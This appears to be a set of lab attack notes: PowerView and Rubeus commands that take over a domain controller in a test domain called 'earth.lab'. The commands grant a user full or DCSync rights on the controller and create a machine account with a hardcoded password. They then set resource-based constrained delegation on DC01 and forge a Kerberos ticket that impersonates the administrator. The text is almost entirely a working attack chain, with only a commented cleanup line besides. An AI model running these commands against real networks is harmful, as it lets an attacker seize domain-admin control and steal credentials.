Add-DomainObjectAcl -TargetIdentity "CN=DC01,OU=Domain Controllers,DC=earth,DC=lab" -PrincipalIdentity nandor -Rights All
# You could also give DCSync rights like
Add-DomainObjectAcl -TargetIdentity "DC=earth,DC=lab" -PrincipalIdentity nandor -Rights DcSync

New-MachineAccount -MachineAccount daclyo -Password $(ConvertTo-SecureString 'Summer2018!' -AsPlainText -Force)

$ComputerSid = Get-DomainComputer daclyo -Properties objectsid | Select -Expand objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)

$TargetComputer = "dc01.earth.lab"
Get-DomainComputer $TargetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}

.\Rubeus.exe s4u /user:daclyo$ /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:administrator /msdsspn:cifs/dc01.earth.lab /ptt

# CLEANUP 
# Remove-DomainObjectAcl -TargetIdentity "CN=DC01,OU=Domain Controllers,DC=earth,DC=lab" -PrincipalIdentity nandor -Rights All